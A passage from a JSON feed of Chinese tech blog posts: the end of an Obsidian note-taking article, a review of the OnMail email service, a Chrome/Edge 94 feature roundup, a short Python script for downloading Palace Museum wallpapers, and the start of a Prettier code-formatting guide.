的方案有<strong>两点</strong>不同：</p>\n<ol>\n<li>TIAGO FORTE 的方案大体上分为 4 层，除了「第四层：总结」之外，其他层级都是在「第一层：原文摘要」上进行「加粗」或「高亮」完成。而在 Obsidian 的方案中，每一层都有自己独立的意义，做到了完全隔离。这样做的好处是，无论是编辑笔记还是阅读笔记，都能按照每一层去理解和处理它。</li>\n<li>TIAGO FORTE 的方案中要求「不同的时间段完成不同层级」这一准则，每段时间对笔记有了新的感悟，再按照对应层级进行编辑（加粗、高亮或者总结）。而在 Obsidian 的方案中，可以在「任意时间编辑任意层」，因为每一层虽然上下文有关联，但是内容上各自独立（第二层甚至会拷贝第一层内容）。所以<strong>只要是因为当前笔记产生了想法或内容，就将他们放到对应的层级，从而保持住笔记的完整性</strong>。</li>\n</ol>\n<h2>最后</h2>\n<p>「渐进式总结」是一种方法论并不是某一个具体的方法，它的思想是「将于同一段内容在不同时期的思考分层整理并记录」，这样<strong>即不丢失细节又突出重点</strong>，方便我们任何时间进行快速回溯。所以我们在使用上不用拘泥用哪一种，甚至不用拘泥用哪一款工具，只要掌握了方法论，它可以应用到任何地方。</p>\n<hr>\n<p>「玩转 Obsidian」系列会持续更新「如何使用 Obsidian 进行知识管理」，对此系列感兴趣可以在以下渠道找到相关文章：</p>\n<ul>\n<li><a href=\"https://sspai.com/my/column/263/post\">少数派专栏 - 知识管理之术</a></li>\n<li><a href=\"https://xzsj.vip/\">闲者时间博客</a></li>\n<li><a href=\"https://xzsj.icu/\">闲者时间 Medium</a></li>\n</ul>\n<p>玩转 Obsidian 系列目前包括文章：</p>\n<ul>\n<li>《<a href=\"https://sspai.com/post/62414\">玩转 Obsidian 01：用 Obsidian 打造「知识循环」利器</a>》</li>\n<li>《<a href=\"https://sspai.com/post/63481\">玩转 Obsidian 02：基础设置篇</a>》</li>\n<li>《<a href=\"https://sspai.com/post/63674\">玩转 Obsidian 03：如何记录「间歇式日记」</a>》</li>\n<li>《<a href=\"https://sspai.com/post/67339\">玩转 Obsidian 04：为什么推荐使用 Obsidian 做知识管理</a>》</li>\n<li>《<a href=\"https://sspai.com/post/68492\">玩转 Obsidian 05：如何进行阅读及摘要</a>》</li>\n<li>《<a href=\"https://sspai.com/write/69025\">玩转 Obsidian 06：如何用 Obsidian 进行渐进式总结</a>》</li>\n</ul>\n<p>可以在 <a href=\"https://twitter.com/xianzheshijian\">Twitter</a>、<a href=\"https://t.me/xztime\">Telegram</a> 、<a href=\"https://instagram.com/shopkeeper.wang\">instagram</a> 等渠道关注我，获取更多有意思的讯息。</p>\n<p>&gt; 下载 <a href=\"https://sspai.com/page/client\" target=\"_blank\">少数派 2.0 客户端</a>、关注 <a href=\"https://sspai.com/s/J71e\" target=\"_blank\">少数派公众号</a>，解锁全新阅读体验 📰</p>\n<p>&gt; 实用、好用的 <a href=\"https://sspai.com/mall\" target=\"_blank\">正版软件</a>，少数派为你呈现 🚀</p>\n","link":"https://sspai.com/post/69025"},{"title":"App+1 | 重新掌控收件箱，功能丰富的新生代邮箱服务：OnMail","date":"2021-09-28 09:30:00","description":"\n<p>最近我找到了一款颜值超高的电子邮件服务，它的名字叫做 OnMail，是由 Edison 公司在 2020 年推出的一款以隐私为中心的电子邮件服务。</p>\n<blockquote>\n<p>OnMail 目前可在 App Store 上用于 iOS。适用于 Android 的新 OnMail 应用程序即将推出。还将开发适用于 Mac 和 Windows 的应用程序。</p>\n<p>OnMail 的电子邮件服务可与任何互联网浏览器一起使用，并与适用于 iOS、Android 和 Mac 的 Edison Mail 应用程序兼容。</p>\n</blockquote>\n<p>而它则包括了授权收件箱、基于自然语言识别的高级搜索以及跟进电子邮件等等特性。</p>\n<h2>许可证</h2>\n<p>现在我们的电子邮件服务器会收到大量的垃圾邮件，各种促销折扣、服务更新、新闻还有牛皮癣广告会充斥我们的电子邮件服务器，这是因为邮件的本意就和挂号信一样，只要对方有你的地址，就可以给你寄送信件。</p>\n<p>为了避免这些垃圾信息，我们不得不花大量的时间来设置过滤、黑名单，但是治标不治本。因为他们可以随时更换邮箱号、设置不同的关键词甚至是图片、PDF 等等，而且我们更换自己的邮箱成本太高了。所以 OnMail 提出的解决办法是，让用户发放许可权限给其他邮箱号。OnMail 提供了一种「基于许可的电子邮件服务」，只有获得权限的邮箱号才能够发送邮件送到你的收件箱，智能、有效的杜绝了所有的不必要的垃圾信息进入我们的系统，这样就从根本上解决了轰炸的源头。每次你收到一个新的邮箱或联系人给你发送邮件，你的 OnMail 都会出现一个许可同意的界面，如果你不同意，那么他们无论如何都无法给你发送消息。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c59b19lb34tcoadpunlg.png\"></figure><p>而如果你选择了 封禁/block 这个账户，那么以后来自这个邮箱的邮件都会被送到垃圾箱里面。可以非常好的保障你收件箱里面的邮件都是你真正需要获取并且获得你的允许的邮件。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c59b1adb34tcoe41hesg.png\"></figure><p>你可以在一个类似于管理页面的地方地方管理所有的许可，处理给予许可账户和封禁账户以及目前搁置的账户。这样就算你误操作了或者是后续需要修改也可以在这里完成。</p>\n<p>同时，我个人非常喜欢的一点就是在整理收件箱的时候，通过点击发件人的头像即可快速将邮件归档，更加符合自觉，同时因为头像和多任务的选项靠的比较近，我可以方便的切换成单个操作或多选操作。而如果归档、已读/未读、删除操作在右边，那么是需要移动一定的距离，反而增加了操作成本。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c59b1alb34tcoe41het0.png\"></figure><p>同时，Onmail 把收件箱分类为 主要/Primary 和 其余/Other 两个分类。其他分类则是类似瀑布流布局的样式，可以一眼看到整个邮件的主要部分，进入预览模式以更快地阅里面的内容，只是我觉得 2 列占用面积太大，对于快速区分和筛选的效率不高。虽然右上角的 Preview 可以切换排列模式，但是如果可自定义会更好。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c59b1bdb34tcokqhdvm0.png\"></figure><h2>跟进邮件</h2>\n<p>这个功能其实我挺喜欢的，当你查看一份邮件的时候，能够看到和这个邮箱账户的所有往来信件。这样很方便我们追溯之前的沟通信息。试想一下当你经过一个假期后，需要与合作对象跟进进度，沟通的时候很可能忘记之前的进展以及沟通详情，而一个假期后你也会受到许多其他邮件，那么只需要找到这个发信人的任意一封邮件都可以查看所有的历史往来邮件，能够节省非常多的精力和时间，也避免了发错邮件的存在。</p>\n<p>同时在这个历史往来的记录里，你还能够看到与这个账户沟通中收到的所有文件、照片，就不再需要我们在对某一个账户进行分类，特别是在工作或者是与他人沟通的时候，能够快速了解之前的沟通情况以及目前的进展。这也是目前其他邮件服务商没有提供的一个服务。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c59b1cdb34tcom8unqr0.png\"></figure><p>除此之外，还有一个 附件/Attachments 的文件夹用于查看你整个收件箱中所有的文件，包括了历史照片、视频、账单、收据、机票和其他信息，相比于我现在用的 Gmail 的确会方便很多。特别是我会每周都通过快捷指令来导出 Leancloud 的数据，Leancloud 会给我发送这个数据库的 json 文件，使用 Gmail 的时候我是通过单独设定了一个过滤器，归类并收纳所有来自 Leancloud 的文件，方便我统一管理和下载文件备份。而通过 OnMail 我可以不用去考虑单独为它过滤，直接去附件库查找即可。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c59b1clb34tcoe41heug.png\"></figure><h2>Inbox Break</h2>\n<p>这个功能其实类似于一种勿扰模式，当你设定好了规定的时间后，所有的邮件都会暂时停止接收到你的邮箱一直到超过你的规定时间后，才会进入你的收件箱。同时，也支持在这个期间内自动发送「离开」回复。这个其实比较适合于工作需求的人，下班后可以暂停收到邮件，其实是把生活和工作分割开来。</p>\n<p>对于我来说，如果在工作一天回到家里后，打算放空一下自己，准备休息的时候收到了工作邮件的提醒，就算是不需要立刻完成的任务，也会给心情带来糟糕的感觉。这也是为什么我非常喜欢飞书而不是微信来工作沟通，因为如果使用微信沟通，那么大家会默认你看见消息（毕竟没人不看微信）。会非常影响自己的生活节奏。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c59b1dlb34tcom8unqrg.png\"></figure><h2>反追踪 Anti-tracking</h2>\n<p>追踪像素会嵌入到电子邮件中，隐藏在图像或链接里。当你打开电子邮件后，跟踪代码就会把追踪信息发送回公司的服务器，它会告诉发送方得知收件人在哪里、在什么时候，在哪种类型的设备上查阅了邮件，随之而来的是无穷无尽的广告邮件、诈骗信息等。而反跟踪技术可阻止侵入性广告定位者监视我们的电子邮件。</p>\n<p>OnMail 提供了自动阅读回执阻止，但是并不会禁用邮箱的图像，让用户用起来更加的放心和便利。而在 Gmail 里面则需要禁用图像才能够实现这个功能。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c59b1e5b34tcoadpunm0.png\"></figure><h2>其余功能</h2>\n<p>其他方面，OnMail 和其他的邮件服务一样，支持你自定义设置邮箱的标签、回复签名、假期自动回复和邮件过滤规则设置等。不过 OnMail 也有缺点就是全英文，不过我相信对于少数派的读者来说，应该不算什么事情。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/28/bed66acddc2fab97ec2e6b39caac2d2e.jpg\"></figure><ol>\n<li>OnMail 提供了 10GB 的存储空间，相比 Google Drive 和所有谷歌服务数据共享的 15GB 则是多了不少。</li>\n<li>如果你有一段时间没有阅读一下订阅的邮件，OnMail 就会自动提醒你是否要退订此邮件，保证你的邮箱一直都是有效信息。</li>\n<li>OnMail 内置了几个 智能文件夹/Smart，能够帮助你分类和整理你的旅行、购物和其他信息进行排序，你不需要做其他的操作就可以分类整理。不过这个功能我个人原因没有体验到。</li>\n<li>OnMail 另一个巧妙的部分是它会自动解析您收到的电子邮件，并智能地呈现其中找到的信息。例如，航班预订将显示为信息卡，如上所示：</li>\n<li>OnMail 免费和个人帐户允许以 @onmail.com 电子邮件地址为后缀的最短 8 个字符或者更多。而升级到 个人/Personal 和 专业/Professional 服务后，则可以最短 4 个字符。不过目前我也不需要这些升级，对于那些英文名或习惯的称呼较短的用户来说，8 个字符会增加一点点易记性。</li>\n<li>OnMail 还支持夜间模式，非常适合那些夜猫子用户，毕竟每次打开 Gmail 我都会被亮瞎我的眼睛。我本身就对所有的带夜间模式的产品感到有好感，这波是非常加分的一点。但是我总觉得这个黑色太深了，如果能够选择灰色可能会对视觉上来说更友好一点。</li>\n</ol>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/28/119da8feac1507a3d9ecb66242589858.png\"></figure><h3>小缺点</h3>\n<h4>有干扰信息的背景图和名人名言</h4>\n<p>不过我也有一些不喜欢的点，那就是 OnMail 喜欢在空页面增加一些风景照和一些「名言警句」让我没有那么舒服，我认为这本身也是一种打扰用户的垃圾信息。当然这是见仁见智，可能有些人会喜欢这张放松的感觉？</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/28/8a35669998ae8c7b6d1f3a5e394624d9.png\"></figure><h4>搜索和筛选功能</h4>\n<p>OnMail 目前的智能筛选所有附件和内容仍然有缺陷，至少没有它们声称的那么完美，我的一些邮件里面的图片、文档并没有检索出来仍然是只能在邮件内查看，在 附件库/Attachments 并没有找到一些应该被展示的数据 。</p>\n<p>其次它的搜索功能里面有一个卖点就是更加智能化的语义搜索，以「last week from jimmy」和「Attachments from Kathryn」为例的功能特点，在中文语境下并不适用，再加上英文界面仍有一定的使用门槛。</p>\n<h2>总结</h2>\n<p>但是总的来说 OnMail 目前看来是一款还不错的新生代邮件，和老牌的服务商相比提供了更多的功能和特性，但仍然有一些地方需要追赶。至少在于用户体验上还是不错的，但是对于 Gmail 和国内的 163 以及 QQ 邮箱其实并不占优势，用户迁移邮箱的成本和意愿也是他们面临的问题之一。但是作为一个临时邮箱我认为是一个很不错的体验。</p>\n<p>&gt; 下载 <a href=\"https://sspai.com/page/client\" target=\"_blank\">少数派 2.0 客户端</a>、关注 <a href=\"https://sspai.com/s/J71e\" target=\"_blank\">少数派公众号</a>，解锁全新阅读体验 📰</p>\n<p>&gt; 实用、好用的 <a href=\"https://sspai.com/mall\" target=\"_blank\">正版软件</a>，少数派为你呈现 🚀</p>\n<p> </p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/69021"},{"title":"更快的稳定版更新节奏开始了：Chrome/Edge 94 新功能盘点","date":"2021-09-28 08:00:00","description":"\n<p>本月，Chrome 和 Edge 正式迎来 4 周一次的全新稳定版更新周期，相比此前（6 周一次）节奏加快了不少。为此，Edge 也从本次更新开始面向企业用户推出了「扩展稳定更新选项」，允许企业用户通过组策略部署的方式将更新周期手动调整为 8 周一次。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c58pgmtb34tehemeg5b0.png\"></figure><p>对普通用户来说，更快的更新节奏虽然难免导致实际更新内容的减少，但偶尔也会有一些不容错过的重要功能更新。本文就为大家汇总了本次 Chrome/Edge 94 稳定版的主要更新内容，希望能为你提供一些参考。</p>\n<h2>Chrome</h2>\n<h3>新版设置界面/桌面端</h3>\n<p>Chrome 设置中心页面在本次稳定版更新后开始启用全新的设计样式。或许是 Google 为了统一 Chrome 的界面以及相关设计元素，新版移除了原先设置页面上方的蓝色顶部通栏，转而采用和 Chrome OS 一致的纯色设计，原先较为冗长的设置项目现在也被有意梳理成了更加直观、易懂的不同设置区域，通过侧边栏即可进行导览。这些更新其实也可以看作是 Google WebUI 设计改造的一部分。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c58pgn5b34tehi7lc44g.png\"></figure><p>如果你在更新到 Chrome 94 稳定版后没有看到新版设置页面，也可以手动开启 <a href=\"chrome:flags#webui-branding-update\" target=\"_blank\">WebUI Branding Update</a> 功能标签来进行体验。</p>\n<h3>新版共享中心/桌面端</h3>\n<p>相比 Edge 很早之前就开始改造分享中心，Chrome 对浏览器分享功能的改造可谓是先发后至，不过在 Chrome 94 中好歹还是上线了。</p>\n<p>和当前的 Android 版 Chrome 类似，新版共享中心可以快速就当前浏览的页面进行链接复制、生成二维码、投射或者保存等操作，同时还提供了部分社交媒体入口方便快速分享。当然有一说一，比起 Edge 的分享功能，Chrome 共享中心支持的跳转目标还是少了点。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c58pgn5b34tehi7lc450.png\"></figure><p>如果你在更新到 Chrome 94 稳定版后没有看到新版设置页面，也可以手动开启 <a href=\"chrome://flags/#sharing-hub-desktop-omnibox\" target=\"_blank\">Desktop Sharing Hub in Omnibox</a> 功能标签来进行体验。</p>\n<h3>可选 HTTPS-only 模式/桌面端、Android</h3>\n<p>虽然 Chrome 从很早之前就开始执行 HTTPS-First 规则，但此前的规则仅在有 HTTP 和 HTTPS 同时可选的情况下才会优先加载 HTTPS 页面。Chrome 94 正式加入的 HTTPS-only 模式就更加严格一点，在设置中选中开启后，如果网站不支持 HTTPS 会被直接阻止加载。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c58pgndb34teho7grh00.png\"></figure><p>对网络安全有较高要求的朋友不妨在「设置 &gt; 隐私设置和安全性 &gt; 高级 &gt; 一律使用安全链接」中开启试试；不过当前的国内互联网环境下，严格的 HTTPS 规则偶尔也会在浏览时造成困扰吧。</p>\n<h3>Material You 视觉更新/Android</h3>\n<p>从 Chrome 93 开始，Google 就开始了针对 Android 12 设计风格的适配，在本次推送的 Chrome 94 中，Material You 又进一步为 Chrome 的外观增色不少。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/28/cca72a92bbcd6d7d27fe40ee92e39d5d.png\"><figcaption>Chomre 94 在 Android 12 上的视觉效果</figcaption></figure><p>地址栏背景、选词高亮背景、标签页预览卡片边框、设置菜单……Chrome 94 中不少浏览器组件都会从 Android 12 的壁纸中提取色彩，让浏览器与系统之间的观感体验更加和谐一致。不过这些新变化在 Chrome 94 也并非是直接开启的，依旧需要通过手动启用 <a href=\"chrome:flags#dynamic-color-android\" target=\"_blank\">Dynamic colors on Android</a> 和 <a href=\"chrome:flags#theme-refactor-android\" target=\"_blank\">Theme refactor on Android</a> 两项功能标签来手动开启。</p>\n<h3>在非标签组中打开新标签/Android</h3>\n<p>Android 版的 Chrome 引入了「标签组」概念之后，新标签中打开链接竟然只能在现有的「标签组」中页面了。虽然是个小变化，但对重度浏览器用户的使用习惯冲击不小。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c58pgntb34tehr0hggrg.png\"></figure><p>或许也是因为这份争议，Chrome 94 稳定版又把允许用户在标签组外的「新标签页打开」功能默默加了回来——但并不是默认开启的，手动启用 <a href=\"chrome://flags/#enable-start-surface\" target=\"_blank\">Start Surface</a> 并选择 <code>Enabled Single Surface V2 Finale</code> 这个选项，然后确保 <a href=\"chrome://flags/#enable-tab-grid-layout\" target=\"_blank\">Tab Grid Layout</a> 功能标签选择 <code>Enabled without auto group</code>，重启后就能在长按菜单中看到「使用新标签页」打开了。</p>\n<h3>桌面版空闲检测/桌面版</h3>\n<p>除了上面我们看到的新功能之外，Chrome 94 中还引入了一个颇具争议的 API：空闲检测（Idle Detection）。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/28/ef67e1c89b6fe7e1a66c3850ffb16736.png\"></figure><p>简单来说，通过这个 API 浏览器可以判断用户当前是否有浏览动作，并通过 API 接口向开发者提供这一状态信息，因此也很有可能被滥用。这一 API 在 Chrome 94 稳定版中默认启用，如果你对这一数据较为敏感，不妨在网站权限控制中对「您的设备使用情况」一项勤加检查。</p>\n<h2>Edge</h2>\n<h3>标签页分组/桌面版</h3>\n<p>这个早已出现在 Chrome 上的功能其实在 Edge 93 中也随垂直标签页回归了，而本次在 Edge 94 中的亮相，可以看作是微软对标签页分组功能的一次正式推广。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c58pgo5b34tehr0hggs0.gif\"></figure><p>Edge 94 稳定版的标签页分组功能相比 Chrome 94 的确要更加好用，除了常规的标题、颜色标记外，Edge 94 也允许我们点击分组标签来对分组进行折叠隐藏，进一步提升标签栏利用空间；同时对 Windows 用户来说也非常友好：我们可以按住 Shift 或 Ctrl 一次性连选、跳选多个标签页面进行分组归纳。</p>\n<h3>新的新闻聚合主页：Microsoft Start/桌面版、移动版</h3>\n<p>Microsoft Start 是微软近期上线的个性新闻源和信息内容集合服务，你可以看作是以往 MSN 新闻内容的升级版，但提供了更为清晰的分类并减少了广告的干扰，现在可以通过设置 <a href=\"https://www.microsoftstart.com/\" target=\"_blank\">Microsoft Start</a> 为主页来进行访问，另外该服务还推出了 Android 和 iOS 独立应用。</p>\n<p>不过就国内用户的体验来说，这里提供的资讯质量相比 Windows 10 任务栏的资讯与天气、Windows 11 小组件页面的资讯而言并无差别。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c58pgolb34tehi7lc460.png\"></figure><h3>购物、旅行好帮手/桌面端</h3>\n<p>或许是一年一度的购物季即将到来，Edge 近期的更新内容不少都和网络购物有关。</p>\n<p>Edge 94 稳定版针对在线购物体验也进行了优化，在访问一些在线购物网站时，可以直接在地址栏查看相关的商品评价和顾客评分，让我们在下单前多一些参考。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c58pgotb34tehr0hggsg.gif\"></figure><p>在某些网站上，Edge 甚至可以直接利用用户保存的信息来自动完成结账，进一步简化购物流程。不过缺点也很明显——这些功能在国内购物网站中并不适用。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c58pgp5b34tehr0hggt0.gif\"></figure><p>与之类似的，你还可以让 Edge 94 来帮助你规划你的旅行和假期，比如通过为旅行目的地提供建议来帮助制定旅行计划、搜索航班时可以在地址栏看到对应地点的餐厅以及观光建议等等。同样是国内几乎用不上的功能。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c58pgpdb34tehi7lc46g.gif\"></figure><h3>改进了打开 MHTML 文件的方式/桌面端</h3>\n<p>MHTML 属于微软当前自己搞出来的网页标准，在这个后 IE 时代显得有些尴尬，但考虑到向前的兼容性有时又必须使用 IE 打开。</p>\n<p>Edge 94 稳定版中，微软调整了该格式文件的打开逻辑：如果启用了 IE 模式，MHTML 将继续使用 IE 模式打开，除非这个 MHTML 是由 Edge 通过保存的；使用 Edge 保存的 MHTML 文件依然默认由 Edge 打开。</p>\n<h3>阻止混合内容下载/桌面端</h3>\n<p>这同样是在 Chrome 就已经有的功能，简单来说就是如果一个网站中的既有 HTTPS 内容也有 HTTP 的内容，那么在当前页面中下载 HTTP 内容将会被阻止。</p>\n<h3>辅助设置汇总/桌面端</h3>\n<p>和 Chrome 类似，在 Edge 94 中终于有了一个可以集中调整辅助设置的页面，并且相比设置分类要更为清晰。</p>\n<p>在「使 Microsoft Edge 更易于查看」这个部分中，我们可以调整页面缩放、打开字幕的系统首选项以及在页面焦点区域周围显示高可见性大纲；而「使 Microsoft Edge 更易于使用」这个部分则提供了在关闭多个标签页之前进行询问、选择文本时显示迷你菜单、下载开始时显示下载菜单等选项。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c58pgplb34tehr0hggtg.png\"></figure><p>总之，更新后花点时间在这个新页面中调校一番，应该能让 Edge 的使用体验更加舒适一点。</p>\n<h2>小结</h2>\n<p>除了上述功能变化，一些偏向开发者的更新以及安全更新本文就不再展开细说了。你选择哪一款浏览器作为主力浏览器使用呢？欢迎在评论区聊聊你的使用体验以及看法。</p>\n<p>&gt; 下载少数派 <a href=\"https://sspai.com/page/client\">客户端 </a>、关注 <a href=\"https://sspai.com/s/J71e\">少数派公众号 </a>，了解更妙的数字生活 🍃</p>\n<p>&gt; 想申请成为少数派作者？<a href=\"https://sspai.com/apply/writing\" target=\"_blank\">冲！</a></p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/69008"},{"title":"使用 Python 爬取故宫壁纸","date":"2021-07-17 05:55:00","description":"\n<p>我非常喜欢故宫壁纸，但是一张一张下载的速度就太慢了。</p>\n<p>于是，我就写了个简单的 Python 小程序自动爬取故宫壁纸。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E4%BB%A3%E7%A0%81\" class=\"headerlink\" title=\"代码\"></a>代码</h2>\n<p>首先，我们通过简单的查看，知道故宫壁纸的页面并没有使用 JavaScript 载入。</p>\n<p>但是故宫壁纸很多，所以还需要分类。</p>\n<p>故宫壁纸大多都是以分类开头，如 <code>爱上紫禁城 紫藤</code>, <code>清   虚谷紫藤金鱼图轴（局部）</code> 等等，所以一般只需要做个简单的 <code>startswith()</code> 判断就 OK 了。</p>\n<p>很多壁纸的标题都是一样的，所以还可以使用 <code>random</code> 库在文件名末尾追加一个随机数。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> requests, bs4, time, random</span><br><span class=\"line\">path = <span class=\"string\">\"./wallpaper/爱上紫禁城\"</span></span><br><span class=\"line\"></span><br><span class=\"line\">catch = <span class=\"number\">0</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">1</span>, <span class=\"number\">119</span>):</span><br><span class=\"line\">    <span class=\"comment\"># 组合请求 URL</span></span><br><span class=\"line\">    url = <span class=\"string\">\"https://www.dpm.org.cn/lights/royal/p/{}.html\"</span>.<span class=\"built_in\">format</span>(i)</span><br><span class=\"line\">    <span class=\"comment\"># 发送请求</span></span><br><span class=\"line\">    response = requests.get(url)</span><br><span class=\"line\">    <span class=\"comment\"># 设定页面编码为 UTF-8</span></span><br><span class=\"line\">    response.encoding = <span class=\"string\">\"UTF-8\"</span></span><br><span class=\"line\">    <span class=\"comment\"># 从 HTML 中解析数据</span></span><br><span class=\"line\">    soup = bs4.BeautifulSoup(response.text, <span class=\"string\">\"lxml\"</span>)</span><br><span class=\"line\">    image = soup.find_all(name=<span class=\"string\">\"div\"</span>, class_=<span class=\"string\">\"pic\"</span>)</span><br><span class=\"line\">    <span class=\"comment\"># 循环输出图片</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> n <span class=\"keyword\">in</span> image:</span><br><span class=\"line\">        catch = catch + <span class=\"number\">1</span></span><br><span class=\"line\">        <span class=\"comment\"># 获得壁纸名称</span></span><br><span class=\"line\">        <span class=\"comment\"># 分类，不是以【爱上紫禁城】开头的壁纸都忽略</span></span><br><span class=\"line\">        img_name = n.a.img[<span class=\"string\">\"title\"</span>]</span><br><span class=\"line\">        <span class=\"keyword\">if</span> img_name.startswith(<span class=\"string\">\"明\"</span>):</span><br><span class=\"line\">            print(<span class=\"string\">\"{}. {}\"</span>.<span class=\"built_in\">format</span>(catch, n.a.img[<span class=\"string\">\"title\"</span>]))</span><br><span class=\"line\">            <span class=\"comment\"># 组合获得壁纸页面</span></span><br><span class=\"line\">            url_1080 = <span class=\"string\">\"https://www.dpm.org.cn\"</span> + n.a[<span class=\"string\">\"href\"</span>]</span><br><span class=\"line\">            <span class=\"comment\"># 请求高清版网页</span></span><br><span class=\"line\">            response_img = requests.get(url_1080)</span><br><span class=\"line\">            <span class=\"comment\"># 再次解析</span></span><br><span class=\"line\">            soup_img = bs4.BeautifulSoup(response_img.text, <span class=\"string\">\"lxml\"</span>)</span><br><span class=\"line\">            <span class=\"comment\"># 获取页面中的图片</span></span><br><span class=\"line\">            data = soup_img.find_all(name=<span class=\"string\">\"img\"</span>)[<span class=\"number\">0</span>]</span><br><span class=\"line\">            <span class=\"comment\"># 获得壁纸图片的链接</span></span><br><span class=\"line\">            img_url = data[<span class=\"string\">\"src\"</span>]</span><br><span class=\"line\">            <span class=\"comment\"># 保存图片</span></span><br><span class=\"line\">            pic = requests.get(img_url).content</span><br><span class=\"line\">            file_name = path + img_name + <span class=\"string\">\"-\"</span> + <span class=\"built_in\">str</span>(random.randint(<span class=\"number\">100000</span>, <span class=\"number\">999999</span>)) + <span class=\"string\">\".jpg\"</span></span><br><span class=\"line\">            <span class=\"comment\"># 写入文件</span></span><br><span class=\"line\">            <span class=\"keyword\">with</span> <span class=\"built_in\">open</span>(file_name, <span class=\"string\">\"wb\"</span>) <span class=\"keyword\">as</span> file:</span><br><span class=\"line\">                file.write(pic)</span><br><span class=\"line\">        </span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            print(<span class=\"string\">\"!Ignore: \"</span> + img_name)</span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#%E5%90%8E\" class=\"headerlink\" title=\"后\"></a>后</h2>\n<p>我把一些我下载下来的壁纸放在了 <a href=\"https://t.yfun.top/dpm-wallpaper\">这里</a>，可以直接预览并下载。</p>\n<p><del>OK，又水了一篇文（</del></p>\n","link":"https://blog.yfun.top/posts/2021/dpm-wallpaper/"},{"title":"使用 Prettier 格式化代码","date":"2021-07-15 06:45:00","description":"\n<p>格式化代码可以提高代码的可读性，使代码更加美观。</p>\n<p>Prettier 支持：</p>\n<ul>\n<li>JavaScript (including experimental features)</li>\n<li>JSX</li>\n<li>Angular</li>\n<li>Vue</li>\n<li>Flow</li>\n<li>TypeScript</li>\n<li>CSS, Less, and SCSS</li>\n<li>HTML</li>\n<li>JSON</li>\n<li>GraphQL</li>\n<li>Markdown, including GFM and MDX</li>\n<li>YAML</li>\n</ul>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%AE%89%E8%A3%85\" class=\"headerlink\" title=\"安装\"></a>安装</h2>\n<h3>\n<a href=\"https://blog.yfun.top/#%E6%8F%92%E4%BB%B6\" class=\"headerlink\" title=\"插件\"></a>插件</h3>\n<p>你可以很方便的在 VSCode 等 IDE 上安装插件，插件名为 <code>Prettier</code>.</p>\n<p>以 VSCode 为例：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.10/rawimg/6a3ad0ea42d55.png\"></p>\n<blockquote><p>如果安装了其他格式化插件，则需要点击 [格式化文档的方式]，选择 <code>Prettier</code>。</p></blockquote>\n<h3>\n<a href=\"https://blog.yfun.top/#CLI\" class=\"headerlink\" title=\"CLI\"></a>CLI</h3>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo npm i -g prettier</span><br></pre></td></tr></table></figure><p>相关的文档可参见官网: <a href=\"https://prettier.io/docs/en/cli.html\">https://prettier.io/docs/en/cli.html</a></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">prettier --write . <span class=\"comment\"># 格式化当前文件夹的所有文件</span></span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#%E9%85%8D%E7%BD%AE\" class=\"headerlink\" title=\"配置\"></a>配置</h2>\n<p>参见官方文档：</p>\n<ul>\n<li><p><a href=\"https://prettier.io/docs/en/configuration.html\">https://prettier.io/docs/en/configuration.html</a></p></li>\n<li><p><a href=\"https://prettier.io/docs/en/options.html\">https://prettier.io/docs/en/options.html</a></p></li>\n</ul>\n<p>Prettier 的配置文件有多种写法：</p>\n<p><img 